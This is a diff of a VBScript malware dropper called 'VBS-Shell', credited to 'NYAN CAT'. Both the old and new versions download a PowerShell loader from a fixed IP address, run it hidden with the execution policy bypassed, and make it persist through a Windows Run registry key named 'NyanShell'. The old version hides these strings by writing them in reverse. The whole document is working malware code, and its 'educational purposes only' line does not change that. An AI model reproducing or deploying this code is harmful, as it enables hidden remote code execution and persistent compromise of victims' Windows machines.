@@ -1,23 +1,26 @@
 ''       / Author     : NYAN CAT
-''       / Name       : VBS-Shell v0.2
+''       / Name       : VBS-Shell
 ''       / Contact    : https://github.com/NYAN-x-CAT
-''       / This program is distributed for educational purposes only.
 
-psLoader = StrReverse(")'txt.redaol/591.1.861.291//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(xei dnammoc- tixeon- neddih elytswodniw- eliforpon- ssapyb ycilopnoitucexe- exe.llehsrewop\0.1v\llehSrewoPswodniW\23metsyS\swodniW\:C")
+''       This program is distributed for educational purposes only.
 
-'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -command iex(New-Object Net.WebClient).DownloadString('http://192.168.1.195/loader.txt')
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "http://192.168.1.195/lo.txt", False
+xHttp.Send
+scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\Loader.ps1"
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile scriptShell, 2
+end with
+WScript.Sleep 1000
+ExecuteAndInstall(scriptShell)
 
-''Loader = https://github.com/NYAN-x-CAT/MalwareShell/blob/master/Malware.ps1
-
-Install(psLoader)
-Execute(psLoader)
-
-Function Execute(script)
+Function ExecuteAndInstall(path)
 Set objShell = CreateObject("Wscript.shell")
-objShell.run(script)
-End Function
-
-Function Install(script)
+objShell.run("powershell -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + path)
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.RegWrite StrReverse("llehSnayN\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"), script, "REG_SZ"
+WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NyanShell","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + path,"REG_SZ"
 End Function
